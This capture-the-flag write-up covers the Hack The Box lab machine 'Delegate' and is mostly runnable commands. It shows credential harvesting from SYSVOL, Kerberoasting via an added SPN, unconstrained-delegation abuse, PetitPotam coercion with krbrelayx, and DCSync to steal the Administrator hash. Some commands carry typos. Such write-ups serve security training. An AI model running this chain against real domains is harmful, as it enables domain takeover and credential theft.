# HTB - Delegate (Medium) - Writeup

## Summary
Delegate is a Windows Active Directory machine where anonymous SMB access reveals hardcoded credentials in a SYSVOL script. These credentials allow modification of a user object (GenericWrite). Kerberoasting via an added SPN yields a password for a user with `SeEnableDelegationPrivilege` and WinRM access. Unconstrained delegation abuse via adding a new computer account, enabling `TRUSTED_FOR_DELEGATION`, DNS/SPN manipulation, and coercing the Domain Controller to authenticate using PetitPotam allows capturing a Kerberos TGT. DCSync then extracts the Administrator hash, granting full domain compromise.

---

## Enumeration

### Nmap Scan
```bash
nmap -sV -Pn <target_ip>
```
**Open ports**: 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985  
**Domain**: `delegate.vl`, **DC **: `DC1.delegate.vl`, **OS**: Windows Server 2022

### SMB Anonymous Access
crackmapexec smb <target_ip> -u '' -p '' --shares

**Shares**: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL` (readable anonymously)

### SYSVOL Enumeration
```bash
smbclient //<target_ip>/SYSVOL -N -c "recurse; prompt OFF; mget *"
```
Downloaded script `users.bat`:
```
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```
**Creds**: `A.Briggs` : `P4ssw0rd1#123`

---

## BloodHound & ACL Analysis

```bash
crackmapexec smb <target_ip> -u 'A.Briggs' -p 'P4ssw0rd1#123'
bloodhound-python -d delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123' -ns <target_ip> -c all --zip
unzip 20260811141006_bloodhound.zip
grep -i "genericwrite" *.json
```

Found: **A.Briggs** (SID ending `-1104`) has **GenericWrite** on **N.Thompson** (SID ending `-1108`).

N.Thompson's attributes:
- Member of `DELEGATION ADMINS` and `Remote Management Users`
- `SeEnableDelegationPrivilege`, `adminCount: 1`, password never expires

---

## Kerberoasting via SPN Addition

Because GenericWrite doesn't allow password reset, we add an SPN to N.Thompson and request a TGS.

```bash
# Add SPN via LDAP
python3 << 'EOF'
from ldap3 import Server, Connection, ALL, MODIFY_ADD
server = Server('<target_ip>', get_info=ALL)
conn = Connection(server, 'delegate\\A.Briggs', 'P4ssw0rd1#123', auto_bind=True)
conn.modify("CN=N.Thompson,CN=Users,DC=delegate,DC=vl", {'servicePrincipalName': [(MODIFY_ADD, ['test/spn'])]})
print("Done:", conn.result)
conn.unbind()
EOF
```

```bash
# Request TGS
impacket-GetUserSPNs 'delegate.vl/A.Briggs:P4ssw0rd1#123' -request -dc-ip <target_ip>

# Crack the hash
echo '$krb5tgs$23$*N.Thompson$DELEGATE.VL$...' > nthompson.hash
hashcat -m 13100 nthompson.hash /usr/share/wordlists/rockyou.txt --force
# Password: KALEB_2341
```

---

## WinRM as N.Thompson

```bash
evil-winrm -i <target_ip> -u 'N.Thompson' -p 'KALEB_2341'
```

*User flag** in `C:\Users\N.Thompson\Desktop\user.txt` (removed)

`whoami /priv` shows **SeEnableDelegationPrivilege**.

---

## Privilege Escalation: Unconstrained Delegation & DCSync

### 1. Add a new computer account
```bash
impacket-addcomputer -dc-ip <target_ip> -computer-name pwn 'delegate.vl/N.Thompson:KALEB_2341'
# Save password: e.g., c84ksIY7349UqtrwnrM46FHpCMma3Il7
```

### 2. Enable Unconstrained Delegation on the new computer
On the DC via WinRM:
```powershell
Set-ADComputer pwn -TrustedForDelegation $true
```
Or from attacker machine:
```bash
bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host <target_ip> add uac 'pwn$' -f TRUSTED_FOR_DELEGATION
```

### 3. Add DSArcord & SPN
```bash
cd krbrelayx
# DNS record pointing to attacker
python3 dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r pwn.delegate.vl -d <my_ip> --action add <target_ip>
# SPN for Kerberos
python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/pwn' -t 'pwn$' -dc-ip <target_ip> <target_ip>
```
Wait ~180s for DNS sync:
```bash
dig pwn.delegate.vl @ <target_ip>
```

### 4. Compute RC4 hash of pwn$ password
```bash
python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "password".encode("utf-16le")).digest()).decode())'
# e.g.: 6d62565fc3122a208e629504f6071acc
```

### 5. Capture Kerberos TGT via krbrelayx & PetitPotam
Kill conflicting services, then run krbrelayx with explicit interface IP:
```bash
sudo fuser -k 53/tcp 2>/dev/null
sudo fuser -k 80/tcp 2>/dev/null
sudo fuser -k 445/tcp 2>/dev/null
python3 krbrelayx.py -hashes :<rc4_hash> -ip <my_ip>
```

In another terminal, force DC authentication with PetitPotam:
```bash
python3 PetitPotam.py -u 'pwn$' -p 'password' -d delegate.vl pwn.delegate.vl <target_ip>
```
krbrelayx will save the TGT as `DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache`.

### 6. DSSync & Extract Administrator Hash
```bash
export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
impacket-secretsdump -k -no-pass dc1.delegate.vl
# Obtain Administrator NT hash: c32198ceab4cc695e65045562aa3ee93
```

### 7. WinRM as Administrator
```bash
evil-winrm -o <target_ip> -u Administrator -H <admin_nt_hash>
```
**Root flag** in `C:\Users\Administrator\Desktop\root.txt` (removed)
